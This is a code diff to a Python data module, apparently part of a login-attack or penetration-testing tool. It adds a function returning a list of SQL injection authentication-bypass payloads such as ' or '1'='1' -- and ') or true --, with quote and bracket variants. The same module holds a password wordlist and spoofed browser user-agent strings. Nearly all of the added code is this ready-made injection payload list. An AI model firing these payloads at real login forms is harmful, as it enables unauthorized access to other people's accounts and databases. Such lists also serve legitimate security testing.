+++ data/__init__.py
@@ -62,6 +62,29 @@ def getPass():
 	1122334411223344
 	letmein""".replace("\t", "")
 	
+def getSQL():
+	return """ or true --
+	 or '1'='1' --
+	 or '1'='1 --
+	' or true --
+	' or '1'='1' --
+	' or '1'='1 --
+	" or true --
+	" or '1'='1' --
+	" or '1'='1 --
+	') or true --
+	') or '1'='1' --
+	') or '1'='1 --
+	") or true --
+	") or '1'='1' --
+	") or '1'='1 --
+	')) or true --
+	')) or '1'='1' --
+	')) or '1'='1 --
+	")) or true --
+	")) or '1'='1' --
+	")) or '1'='1 --""".replace("\t", "")
+	
 def getAgent():
 	return """Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6
 	Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)